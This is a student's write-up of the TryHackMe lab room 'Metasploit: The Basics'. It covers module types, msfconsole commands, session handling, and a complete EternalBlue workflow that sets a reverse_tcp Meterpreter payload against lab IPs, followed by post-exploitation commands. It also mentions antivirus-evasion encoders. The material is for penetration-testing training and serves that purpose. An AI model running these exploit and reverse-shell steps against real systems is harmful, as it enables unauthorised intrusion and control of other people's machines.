# TryHackMe — Metasploit: The Basics

![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-212C42?style=flat&logo=tryhackme&logoColor=white)
![Path](https://img.shields.io/badge/Path-Jr%20Penetration%20Tester-red)
![Topic](https://img.shields.io/badge/Topic-Metasploit-brightgreen)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen)
![Date](https://img.shields.io/badge/Completed-June%202026-purple)

---

## Overview

| Field | Details |
|-------|---------|
| Platform | TryHackMe |
| Room | Metasploit: The Basics |
| URL | tryhackme.com/room/metasploitthebasics |
| Path | Jr Penetration Tester → Metasploit and Exploitation |
| Tasks Completed | Task 1 — Task 6 (all, 100%) |
| Date Completed | June 2026 |

---

## Tasks Completed

| Task | Topic | Status |
|------|-------|--------|
| Task 1 | Introduction to the Metasploit Framework | ✅ Done |
| Task 2 | Core Concepts and Module Types | ✅ Done |
| Task 3 | Navigating Msfconsole | ✅ Done |
| Task 4 | Configuring and Running Modules | ✅ Done |
| Task 5 | Managing Sessions | ✅ Done |
| Task 6 | Conclusion | ✅ Done |

---

## Task 1 — Introduction to the Metasploit Framework

Metasploit is the world's most widely used penetration testing framework. It provides a structured environment for developing, testing, and executing exploits against target systems.

**Two editions:**

| Edition | Description |
|---------|-------------|
| Metasploit Framework | Free, open-source, command-line (`msfconsole`) |
| Metasploit Pro | Commercial, GUI-based, enterprise features |

**What Metasploit is used for:**
- Exploit known vulnerabilities on target systems
- Generate and deliver payloads
- Post-exploitation — privilege escalation, pivoting, persistence
- Auxiliary tasks — scanning, enumeration, fuzzing

**Launch Metasploit:**
```bash
msfconsole
```

---

## Task 2 — Core Concepts and Module Types

Metasploit is built around **modules** — self-contained units that each perform a specific task.

### Module Types

| Module | Purpose | Example |
|--------|---------|---------|
| **Exploit** | Takes advantage of a vulnerability to gain access | `exploit/windows/smb/ms17_010_eternalblue` |
| **Payload** | Code executed on the target after exploitation | `windows/x64/meterpreter/reverse_tcp` |
| **Auxiliary** | Scanning, enumeration, fuzzing — no shell | `auxiliary/scanner/smb/smb_ms17_010` |
| **Post** | Post-exploitation actions on a compromised session | `post/multi/recon/local_exploit_suggester` |
| **Encoder** | Obfuscates payload to evade AV detection | `encoder/x86/shikata_ga_nai` |
| **NOP** | No-operation sleds used in buffer overflow exploits | `nop/x86/single_byte` |
| **Evasion** | Generates AV-evasive payloads | `evasion/windows/applocker_evasion_msbuild` |

### Payload Types

| Type | How it works |
|------|-------------|
| **Singles** | Self-contained — execute and done (e.g. add a user) |
| **Stagers** | Small payload that establishes connection, then downloads stage |
| **Stages** | Downloaded by stager — full featured (e.g. Meterpreter) |

**Naming convention:**
```
windows/x64/meterpreter/reverse_tcp
  │       │       │           │
  OS    arch   payload    connection type
```

- `/` in name = staged payload
- `_` in name = stageless payload (e.g. `meterpreter_reverse_tcp`)

---

## Task 3 — Navigating Msfconsole

### Essential commands

```bash
# Help and navigation
help                          # Show all commands
help <command>                # Help for specific command
exit                          # Quit msfconsole

# Searching for modules
search <keyword>              # Search by name, CVE, platform
search type:exploit platform:windows smb
search cve:2017-0144          # Search by CVE number

# Using a module
use <module_path>             # Load a module
use exploit/windows/smb/ms17_010_eternalblue
use 0                         # Use by search result number

# Module information
info                          # Full module details
show options                  # Required and optional parameters
show payloads                 # Compatible payloads for this exploit
show targets                  # Supported target versions

# Navigation
back                          # Exit current module
previous                      # Return to last used module
```

### Searching effectively

```bash
search eternalblue            # By name
search ms17-010               # By Microsoft bulletin
search type:auxiliary scanner  # By type + keyword
search platform:linux rank:excellent  # By platform + reliability rank
```

**Module rank** indicates reliability:

| Rank | Meaning |
|------|---------|
| Excellent | No side effects, reliable |
| Great | Has default target, auto-detection |
| Good | Common platform default |
| Normal | Doesn't meet above but works |
| Average | Difficult to exploit reliably |
| Low | Near 50% success rate |
| Manual | Requires manual steps |

---

## Task 4 — Configuring and Running Modules

### Standard workflow

```bash
# 1. Find and load the module
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue

# 2. View required options
show options

# 3. Set required parameters
set RHOSTS 10.10.10.1         # Target IP
set RPORT 445                 # Target port (often pre-set)
set LHOST 10.10.14.5          # Your IP (for reverse shells)
set LPORT 4444                # Your listening port

# 4. Set payload
set payload windows/x64/meterpreter/reverse_tcp

# 5. Verify configuration
show options                  # Confirm everything is set

# 6. Run
run                           # Execute the module
exploit                       # Alternative to run
```

### Global vs module options

```bash
setg LHOST 10.10.14.5         # Set globally — persists across modules
setg RHOSTS 10.10.10.1        # Useful when testing multiple modules on same target
unset LHOST                   # Clear a single option
unsetg LHOST                  # Clear global option
```

### Useful options

```bash
set VERBOSE true              # Show detailed output
set ConnectTimeout 10         # Adjust connection timeout
check                         # Check if target is vulnerable (if module supports it)
```

---

## Task 5 — Managing Sessions

After successful exploitation, Metasploit opens a **session** — an active connection to the compromised target.

### Session commands

```bash
# From within msfconsole
sessions                      # List all active sessions
sessions -l                   # Same as above (list)
sessions -i 1                 # Interact with session 1
sessions -k 1                 # Kill session 1
sessions -K                   # Kill all sessions
sessions -u 1                 # Upgrade shell session to Meterpreter
```

### Meterpreter basics

Meterpreter is Metasploit's advanced post-exploitation payload. It runs entirely in memory — no files written to disk.

```bash
# Once inside a Meterpreter session
sysinfo                       # Target OS, hostname, architecture
getuid                        # Current user
getpid                        # Current process ID
pwd                           # Current directory on target
ls                            # List files
download file.txt             # Download file from target
upload shell.exe              # Upload file to target
shell                         # Drop into OS shell
background                    # Send session to background (back to msfconsole)
exit                          # Close session
```

### Background and resume

```bash
# Inside Meterpreter — background the session
background                    # or Ctrl+Z

# Back in msfconsole
sessions                      # See backgrounded session
sessions -i 1                 # Resume it
```

### Post-exploitation from session

```bash
# Load a post module against an existing session
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

---

## Complete Workflow Example

```bash
# Launch Metasploit
msfconsole

# Search for EternalBlue
search ms17_010

# Load exploit
use exploit/windows/smb/ms17_010_eternalblue

# Check options
show options

# Configure
set RHOSTS 10.10.10.40
set LHOST 10.10.14.5
set payload windows/x64/meterpreter/reverse_tcp

# Verify target is vulnerable
check

# Execute
run

# Meterpreter session opens
sysinfo
getuid
background

# Post-exploitation
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

---

## Key Takeaways

- **Metasploit organises everything into modules** — once you understand the module types (exploit, payload, auxiliary, post), the framework becomes intuitive
- **`search` is your most important command** — you will never memorise all module paths; searching by CVE, name, or platform is how professionals use Metasploit
- **Staged vs stageless payloads matter** — use staged (`/`) when you need full Meterpreter features; use stageless (`_`) when reliability matters more than features
- **Meterpreter runs in memory** — no file written to disk means it evades many AV solutions and leaves fewer forensic artefacts
- **`background` and `sessions -i` are fundamental** — real engagements involve juggling multiple sessions across multiple targets; learn to manage them from the start
- **Always use `check` before running an exploit** — blind exploitation wastes time and creates noise; verify vulnerability first when the module supports it

---

## Metasploit Quick Reference

```bash
msfconsole                              # Launch
search <keyword>                        # Find modules
use <module>                            # Load module
show options                            # View parameters
set RHOSTS <IP>                         # Set target
set LHOST <IP>                          # Set your IP
set payload <payload>                   # Set payload
run / exploit                           # Execute
sessions -l                             # List sessions
sessions -i <ID>                        # Interact with session
background                              # Background session
```

---

## Connection to My Learning Path

This room directly supports:
- **Infrastructure pentest** — Metasploit was used in the Guided Pentest: Infrastructure room
- **Weekend tool practice** — Week 9 in my tool schedule is dedicated to Metasploit depth
- **TryHackMe machines** — Upcoming rooms (Alfred, Steel Mountain, HackPark) all use Metasploit

---

## Resources

- [Metasploit Unleashed — free full course](https://www.offensive-security.com/metasploit-unleashed/)
- [Rapid7 Metasploit Docs](https://docs.rapid7.com/metasploit/)
- [PayloadsAllTheThings — Metasploit](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

## My Progress

- [x] Guided Pentest: Web Application
- [x] Guided Pentest: Infrastructure
- [x] SQL Injection
- [x] CSRF Introduction
- [x] Nmap Live Host Discovery
- [x] Nmap Basic Port Scans
- [x] Metasploit: The Basics ← *this writeup*
- [ ] Metasploit: Exploitation
- [ ] XSS, Authentication — continuing PortSwigger

---

*Part of my 6-month cybersecurity portfolio — [github.com/shehrozmajeed](https://github.com/shehrozmajeed)*
